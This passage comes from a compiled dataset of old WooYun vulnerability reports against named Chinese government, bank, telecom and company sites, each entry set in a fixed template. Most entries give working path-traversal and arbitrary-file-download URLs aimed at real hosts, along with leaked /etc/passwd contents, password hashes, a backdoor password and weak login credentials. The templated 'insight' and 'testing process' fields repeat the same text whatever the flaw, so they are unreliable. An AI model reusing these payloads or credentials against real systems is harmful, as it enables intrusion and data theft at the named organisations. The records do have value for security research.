**POC**: 目录遍历http://218.106.129.39/V2Conf/jsp/main/

**绕过**: 直接利用

**修复**: 删除svn信息
---

---
### [wooyun-2014-059787] 江苏省某环境检测平台某端口未授权访问，导致目录遍历和网站源码泄露
**厂商**: 江苏省某环境监测中心 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先发现了一个监控平台然后习惯性地试试了8080端口，结果。。。最后把网站源码下了下来，在web.config中还发现了数据库地址、账号和密码（Ps:这么简单真的没问题吗）然后就没有了，未做深入

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 看着办吧
---

---
### [wooyun-2015-089883] 联通彩信系统可任意文件下载
**厂商**: 中国联通 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://mmbox.myuni.com.cn/portalWeb/downloadservlet?downloadname=20150104/../../../../../../../../etc/passwd&TELPHONENUM=8618611881111&fujianFlag=true鸡肋之处:1,必须登录2,TELPHONENUM必须是当前登录的手机号补图:

**POC**: http://mmbox.myuni.com.cn/portalWeb/downloadservlet?downloadname=20150104/../../../../../../../../etc/passwd&TELPHONENUM=8618611881111&fujianFlag=true鸡肋之处:1,必须登录2,TELPHONENUM必须是当前登录的手机号补图:

**绕过**: 直接利用

**修复**: 找华为的啊.!
---

---
### [wooyun-2015-0128977] 重庆市敏感单位数据库泄露导致部分信息泄露
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在通过扫描目录的时候突然提示下载1.rar文件下载解压一看,里面有好多车主数据.http://www.cqcgs.gov.cn/1.rar

**POC**: insert into T_NEWXH_JDCXX_DC (N_XHBH, C_KEY, C_LPHM, D_DJRQ, C_LPXH, N_BH, C_HPZL, C_HPHM, C_CLPP1, C_CLXH, C_CLSBDH, C_FDJH, C_CLLX, C_SFZMMC, C_SFZMHM, C_SYR, C_XXDZ, C_YZBM, C_LXDH, C_BXGS, C_BXPZH, D_BXQQ, D_BXZQ, D_YXHPSJ, D_QDHPSJ, D_YBLSJ, C_BLYWGLBM, C_JYM, C_JYW, C_IP, C_XHZT, D_CJSJ, C_SFZ

**绕过**: 直接利用

**修复**: 删除1.rar
---

---
### [wooyun-2015-093300] 交通银行重要分站任意文件下载漏洞（可读取passwd）
**厂商**: 交通银行 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 交通银行信用卡分站http://creditcard.bankcomm.com/web/common/getfile.jsp?p=..\\..\\..\\..\\etc\\passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/bin/bashdaemon:x:2:2:Daemon:/sbin:/bin/bashlp:x:4:7:Printing daemon:/var/spool/lpd:/bin/bashmail:x:8:12:Mailer daemon:/var/spool/clientmqueue:/bin/falsegames:x:12:100:Games account:/var/games:/bin/bashwwwrun:x:30:8:WWW daemon apache:/var/lib/wwwrun:/bin/fal

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0138193] 小蛋科技git服务使用不当导致源码泄露
**厂商**: iqegg.com | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、首先探测到http://www.iqegg.com/.git/config2、文件可读3、用李姐姐的Githack-master就可以把文件下载下来4、eshop的二次开发？

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-083832] 长安信托任意文件下载漏洞（泄露数据库密码）
**厂商**: 长安信托 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 长安信托下载网页path参数未过滤，可以下载任意文件http://www.xitic.cn/front/download.do?path=/uploads/2013/04/24/../../../../WEB-INF/web.xml&id=http://www.xitic.cn/front/download.do?path=/uploads/2013/04/24/../../../../WEB-INF/classes/conf/jdbc.properties&id=http://www.xitic.cn/front/download.do?path=/uploads/2013/04/24/../../../../../../../etc/passwd&id=

**POC**: passwd文件jdbc.properties配置信息，包含数据库密码

**绕过**: 直接利用

**修复**: 过滤path参数
---

---
### [wooyun-2014-073396] 心动网分站目录遍历，疑似rsync服务器
**厂商**: 心动游戏 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://jk.xd.com/

**POC**: http://jk.xd.com/gentoo-portage/www-apache/mod-auth-mysql/files/12_mod_auth_mysql.conf改台服务器看着像rsync的服务器  没linux。。。

**绕过**: 直接利用

**修复**: 限制目录访问
---

---
### [wooyun-2015-0119731] it168某站点任意文件读取漏洞
**厂商**: IT168.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 模板处理不当，引入目录遍历：http://sou.it168.com/article?channelId=0&f=9001&ie=utf-8&q=1&st=20&template=../../../../../../../../../../etc/passwd%00http://sou.it168.com/article?channelId=0&f=9001&ie=utf-8&q=1&st=20&template=../../../../../../../../../../etc/my.cnf%00.jpg

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 限定不可跨父目录
---

---
### [wooyun-2014-085810] U-Mail最新版任意文件下载漏洞
**厂商**: U-Mail邮件服务系统 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出现的位置是在图片预览的地方http://192.168.1.24/webmail/client/mail/index.php?module=operate&action=attach-img-preview&d_url=1.gif&type=application/octet-stream关键代码如下：if ( ACTION == "attach-img-preview" ){$download_url = $_GET['d_url'];$type = $_GET['type'];$data = get_url_data( $download_url );header( "Content-type: ".$type );header( "Expires: 0" );header( "Pragma: public" );echo $data;exit( );}zend解密出来的代码，凑

**POC**: http://192.168.1.24//webmail/client/mail/index.php?module=operate&action=attach-img-preview&d_url=file://C:\windows\win.ini&type=text/htm给个官网测试链接（需要点击试用，登上一个普通账号）：http://mail.comingchina.com/webmail/client/mail/index.php?module=operate&action=attach-img-preview&d_url=file://C:\\windows\win.ini&type=

**绕过**: 直接利用

**修复**: 过滤d_url参数
---

---
### [wooyun-2015-0156288] 华为应用市场安装应用过程可被本地恶意软件劫持
**厂商**: 华为技术有限公司 | **年份**: 2015 | **类型**: 权限提升

**元思考**: 触发信号: 功能测试

**洞察**: 权限提升防护不足，开发者信任前端输入

**测试流程**:
1. 识别权限提升相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 华为应用市场在华为手机上是预装应用。华为应用市场在安装应用过程中，首先会将APK文件下载到/sdcard/Android/data/com.huawei.appmarket/AppCache/目录下。恶意应用只要具有读写SD卡的权限，就可以在APK下载完成后，程序安装前替换APK文件。尽管从APK下载完成到调用系统API来安装应用的时间非常短暂，但攻击者（一个恶意应用）仍然可以检测并利用。恶意应用可以监控该目录并判断APK文件是否下载成功，然后替换APK文件。只要/sdcard/Android/data/com.huawei.appmarket/AppCache/目录出现了以.apk结尾的文件，就代表APK下载成功。因为是预装应用，华为应用市场可静默安装应用。利用该漏洞，攻击者（一个恶意应用）可以替换原有待安装应用而静默安装恶意或者重打包应用。例如，用户原本希望安装微信，但实际上安装的是具

**POC**: demo:在最新版本**.**.**.**上测试http://**.**.**.**/v_show/id_XMTM5Njk0OTA4MA==.html密码：sechonor7

**绕过**: 直接利用

**修复**: 修复方式是下载apk至应用的内部目录下，然后将apk设置成全局可读后再安装。
---

---
### [wooyun-2014-055096] 中国建德网站目录遍历及弱口令可下载数据库
**厂商**: 中国建德网 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 爱找政府网站    有礼物吗？

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 政府现在怎摸了 还没有小网站安全
---

---
### [wooyun-2015-0151705] 某市房产交易平台存在弱口令漏洞
**厂商**: 某市房产 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/clf/system/clfindex.aspx  万能密码

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-055441] 安全管家论坛备份数据库文件下载
**厂商**: 安全管家 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我们可以访问网站:bbs.anguanjia.com/utility/restore.php就可以看到数据备份文件，还支持下载哦。

**POC**: 我们可以访问网站:bbs.anguanjia.com/utility/restore.php就可以看到数据备份文件，还支持下载哦。下载文件证明sql代码：

**绕过**: 直接利用

**修复**: 你们都懂的！
---

---
### [wooyun-2015-0114685] 海尔某网站任意文件下载漏洞
**厂商**: 海尔集团 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://choujiang.haier.nethttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/http://choujiang.haier.net/images/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 看着办吧。额也不懂。
---

---
### [wooyun-2013-021000] 江苏省水利厅任意文件读取，导致源码泄露
**厂商**: 江苏省水利厅 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接给库的pwd：http://www.jswater.gov.cn:8080/docs/funcspecs/2.jsp?sort=1&file=D%3A%5Capp%5CTomcat6%5Cwebapps%5Cjssw%5CWEB-INF%5Cclasses%5CSqlServerJdbc.properties剩下的大家都懂，再次求个码

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 大牛们比我懂
---

---
### [wooyun-2014-066477] 盒子支付邮件服务器任意文件读取漏洞
**厂商**: 深圳盒子支付 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.exploit-db.com/exploits/30085/ 漏洞地址https://mail.iboxpay.com/zimbra/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00

**POC**: a.root="x:0:0:root:/root:/bin/bash";a.bin="x:1:1:bin:/bin:/sbin/nologin";a.daemon="x:2:2:daemon:/sbin:/sbin/nologin";a.adm="x:3:4:adm:/var/adm:/sbin/nologin";a.lp="x:4:7:lp:/var/spool/lpd:/sbin/nologin";a.sync="x:5:0:sync:/sbin:/sbin/nologin";a.shutdown="x:6:0:shutdown:/sbin:/sbin/nologin";a.halt="x

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-071338] 湖北省某通用CMS任意文件下载
**厂商**: www.jetsum.com | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 影响厂商武汉万网捷讯数码技术有限公司http://www.jetsum.com/google关键词技术支持:武汉万网捷讯数码技术有限公司upload.jsp?name=测试用例几个http://www.whldkjgs.com/upload.jsp?name=/WEB-INF/web.xmlhttp://www.whxianggang.cn/upload.jsp?name=/WEB-INF/web.xmlhttp://wetem.net.cn/upload.jsp?name=/WEB-INF/web.xmlhttp://www.hbyl.gov.cn/upload.jsp?name=/WEB-INF/web.xmlhttp://www.hbyfxxw.com/upload.jsp?name=/WEB-INF/web.xml

**POC**: http://www.whxianggang.cn/upload.jsp?name=upload.jsp下面是下载的upload.jsp文件<%@page contentType="text/html;charset=gbk" import="java.io.*,java.util.*,java.net.*,javax.servlet.http.*" %><%!public void downLoad(HttpServletResponse response,String fileName, String realPath)  throws  Exception {File f = new F

**绕过**: 直接利用

**修复**: 验证name的有效性
---

---
### [wooyun-2012-08067] 5Ucms网站源码存在后门
**厂商**: 无忧网络 | **年份**: 2012 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可能是前段时间的漏洞，导致5ucms被入侵了，网站源码被放入了后门文件下载最新版的 ASP GBK V3后门文件存在于：5u_gbk_V3.2012.0301\admin\DatePicker\lang\隐藏文件 en.php加密了60次，后门密码good

**POC**: 把en.php单独上传至网站测试确实是后门，密码为good

**绕过**: 直接利用

**修复**: 这样的事情你们最懂了……
---

---
### [wooyun-2015-0121191] 国华人寿某系统存在任意文件下载漏洞
**厂商**: 国华人寿 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 国华人寿寿险业务系统漏洞地址http://broker.guohualife.com/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/passwd

**POC**: http://broker.guohualife.com/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/hosts

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2012-05534] 百度网盘文件下载
**厂商**: 百度 | **年份**: 2012 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 百度网盘文件下载

**POC**: 文件也没有共享，只要获得这个链接，不论登不登录，都可以直接下载，无需跳转下载页http://bs.baidu.com/baohe00/8ae903994dafa2992d417018164be8f2?sign=MBO:3Key1GFs1xQp:JJW0PxJLSOOjKUkP0wwZFtzD4Yg%3D&13325747944984&response-content-disposition=attachment;%20filename=%E7%BB%9D%E5%AF%B9%E9%98%B2%E5%BE%A1%20V3.3%20%E6%AD%A3%E5%BC%8F%E7%89%88.7z&res

**绕过**: 直接利用

**修复**: =。=
---

---
### [wooyun-2015-0119732] 华夏人寿保险某站存在任意文件下载漏洞
**厂商**: 华夏人寿保险 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 华夏人寿航意险出单系统地址：http://gdxt.hxlife.com/ui问题链接：http://gdxt.hxlife.com/ui/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/passwd

**POC**: http://gdxt.hxlife.com/ui/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/hosts

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0133894] 四川音乐学院学工网目录遍历+PUT创建文件
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 0x1:目录遍历http://**.**.**.**/xgweb/App_Themes/http://**.**.**.**/xgweb/WebSite/http://**.**.**.**/xgweb/Css/0x2：任一用户创建文档

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 对目录进行权限限制
---

---
### [wooyun-2015-091444] 中国电信某业务可文件遍历(泄漏数据库配置，外网redis可连接)
**厂商**: 189.cn | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目录遍历位于：http://vip.189.cn/web/front/downloadFile?name=/../../../../../../../..//../../etc/passwd%00.docx非root，但依然可以读取不少有用信息。

**POC**: 首先读取passwd，找到3个用户，root暂不管，权限不够：zh_readonly:x:620:620::/home/zh_readonly:/bin/bashresin_order:x:622:622::/home/resin_order:/bin/bashresin_mgr:x:625:625::/home/resin_mgr:/bin/bash接着读取/home/resin_mgr/.bash_history，找到了cd /data/jsp/lsllcd mgr.vip.189.cn/lscd order_mgr/lscd skinlsvim /data/jsp/mgr.vip.189

**绕过**: 直接利用

**修复**: 限制可下载的文件
---

---
### [wooyun-2013-041173] appcms最新补丁处理不当仍然任意文件下载
**厂商**: appcms.cc | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 经补丁后的文件pic.php如下（注释为本人做的说明）<?phpif(isset($_GET['url']) && trim($_GET['url']) != '' && isset($_GET['type'])) {$img_url = base64_decode($_GET['url']);$_GET['url']=strtolower($img_url);        //解码后相当于没有编码$_GET['type']=strtolower($_GET['type']);$arr_a=array('jpg','jpeg','png','gif');   //扩展名白名单$down=0;                                  //down=1时标记审计策略通过foreach($arr_a as $b){                    //循环审计i

**POC**: 1.先证明官方演示站点已经打过补丁，即不存在之前的老漏洞2.证明本次漏洞的存在http://www.kele8.cn/pic.php?url=MWpwZy8uLi9jb3JlL2NvbmZpZy5jb25uLnBocA==&type=jpg

**绕过**: 编码绕过

**修复**: 严格过滤url中不能有特殊字符话说漏洞要记得到乌云---确认----给高危RANK---然后自己留着别公开，不然超时或者直接标记忽略的话---会直接向公众公开---，其实只要确认后不公开，不用着急发补丁发公告的，反正别人也看不到，下一版本出来时默默地顺便补上就是了，然后再公开什么的
---

---
### [wooyun-2014-064342] 搜狗某站点任意文件读取
**厂商**: 搜狗 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 出现问题的站点：ie.sogou.com下载etc/passwd下载etc/hosts

**POC**: http://ie.sogou.com//skins/?path=../../../../../../../../../../etc/hosts&route=user/themeedit/getThemeFilehttp://ie.sogou.com//skins/?path=../../../../../../../../../../etc/passwd&route=user/themeedit/getThemeFile

**绕过**: 直接利用

**修复**: 目测应该是下载功能有关，但是修补的时候可以对path进行控制，指定目录即可。跳出目录的话一律exit
---

---
### [wooyun-2012-07506] 盛大某分站权限配置不当导致数据库备份文件下载
**厂商**: 盛大网络 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://cy.sdo.com 多个目录可以暴力猜解，可能导致敏感数据泄露甚至内部网络被渗透。

**POC**: http://cy.sdo.com/200903/data/bakup/http://cy.sdo.com/200903/data/bakup/gfcysd_20090311_6142_1.sqlhttp://cy.sdo.com/200903/data/bakup/gfcysd_20090311_6142_2.sqlhttp://cy.sdo.com/200903/data/bakup/gfcysd_20090311_6142_3.sql

**绕过**: 直接利用

**修复**: 正确配置匿名用户权限，合理的备份文件命名机制及及时清除测试文件。
---

---
### [wooyun-2015-0125670] 浙江省教育技术中心几处问题打包，泄露重要信息
**厂商**: 浙江省教育技术中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 恩，目录遍历导致源码 还有数据库任意下载。还有处未授权访问。

**POC**: 两处目录遍历http://122.225.201.217:8080/http://122.225.201.233:8080/http://122.225.201.217:8080/trac.passwdadmin:HQxMV.g6grFMYyyj:WBQlsL7IhabP2hzcxy:KzKshHof7xB/wlihaijun:f4cN7qDsoGARIliuxd:X573UG5j4Xc.kwangyu:xXIRzLuSRcVoUwjy:dTBgw2vNp.CaMzjjdlxf:TGQKybx6DeizUjhxm:F/qFntCEZm4/2xunuo:UzzENy9tcLcMschalinoo

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2014-065607] 辽宁省就业网存在任意文件下载漏洞
**厂商**: 辽宁省就业网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.jvw.gov.cn

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2014-073088] 深圳航空内部平台对外导致部分敏感信息泄露(包括机场地图、航行区域、飞机坐标等)
**厂商**: 深圳航空 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题有三：1、http://prep.shenzhenair.com/ 这个平台应该是内部使用的，外网可访问。http://prep.airkunming.com/ 昆明航空同理，一个集团的吧。2、虽然设置了 robots.txt ，不过显然不是所有搜索引擎都会遵守这个协议。通过某些搜索引擎可以获取到一些文件下载。敏感文件包括各机场的 飞机停留位置、机场平面图、仪表进近图、仪表离场图等。3、我之所以知道这个域名主要是你们的一个空姐，在某APP上秀了一下这个平台登录进去之后的截图，需加强员工安全意识教育啊。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 权限控制你们自己想办法，另外“敏感文件”这个概念，历来是官方觉得敏感才算敏感，你们自己看吧。另外登录表单里的加密算法，最好写到服务端吧。
---

---
### [wooyun-2015-0149415] 运营商安全之中国移动某系统任意文件读取
**厂商**: 中国移动 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国移动外勤通管理系统

**POC**: **.**.**.**/beapp/dow.download?filename=../../../../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-044660] 东软uniportal1.2存在任意文件下载漏洞
**厂商**: 东软集团 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 程序未对文件路径及文件类型进行过滤，导致下载任意文件。测试中发现成功率不是百分百，分析可能是与操作系统类型有关。

**POC**: 出现问题的文件为：/portal/SiteManager/site/displayimg.jsp下载任意文件举例:http://www.domain.cn/ecdomain/portal/SiteManager/site/displayimg.jsp?path=\WEB-INF\web.xml程序代码：<%@ page contentType="text/html; charset=UTF-8" %><%@ page import="com.neusoft.im2.util.HttpUtils"%><%@ page import="java.io.File"%><%String path=re

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2015-0100897] 国航某站敏感信息泄露及目录遍历漏洞
**厂商**: 中国国际航空股份有限公司 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一切的一切来源于某次搜索引擎搜索谷粉搜搜搜索site:airchina.com.cn admin奇怪的是，谷歌直接搜不到发现了两处日志文件泄露http://mp.airchina.com.cn:38443/MAGLIBv0.6/magserver/local/log/mag.log.2012-10-12.txthttp://mp.airchina.com.cn:38443/MAGLIBv0.6/magserver/local/log/mag.log.2013-12-15.txt这些东西还是很有用的比如用来分析加密方法密码QW40N0JUSHFwRzVXWQ==是采用base64加密解密结果为An47BTHqpG5WY仔细分析，发现还有一道加密密文格式为DES(unix)再次解密，密码为123但是密码已改，不能登陆，有点遗憾往上走，发现访问如下网址可以获取觉得路径http://mp.airc

**POC**: 如上

**绕过**: 直接利用

**修复**: 删除
---

---
### [wooyun-2012-07776] 济宁市人力资源和社会保障局存在任意目录遍历、SQL注射等
**厂商**: 济宁市人力资源和社会保障局 | **年份**: 2012 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站被其他黑客攻陷，发现了黑客留下的小马。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 我不懂，你懂的。
---

---
### [wooyun-2015-0145509] 驴妈妈某业务系统站点弱口令到各类越权(涉及客户敏感信息)
**厂商**: 驴妈妈旅游网 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题站点：http://ebooking.lvmama.com/驴妈妈供应商管理系统1 # 弱口令经测试发现，该站点存在弱口令帐号密码：test/123456嗯，成功登录。2 #  订单越权在查看订单详情处，存在越权漏洞点击后，链接为：http://ebooking.lvmama.com/vst_ebooking/ebooking/super_order/hotel/orderck.do?ebkTaskId=83902&actionType=select可修改 ebkTaskId  的值进行遍历如：http://ebooking.lvmama.com/vst_ebooking/ebooking/super_order/hotel/orderck.do?ebkTaskId=81900&actionType=selecthttp://ebooking.lvmama.com/vst_ebooki

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-068273] 完美世界dota2某分站任意文件下载
**厂商**: 完美时空 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 新上线的网站  顺手看了一眼 发现一个任意文件下载网址http://tishow.dota2.com.cn/存在问题的urlhttp://tishow.dota2.com.cn/index.php?m=Index&a=down&path=../../../etc/passwdthinkphp写的程序  同服务器还有其他的网站 就不做深的检测了

**POC**: 资深刀友求刀币  T_T

**绕过**: 直接利用

**修复**: 做好限制
---

---
### [wooyun-2015-0157564] 通达OA任意文件下载漏洞
**厂商**: 通达信科 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
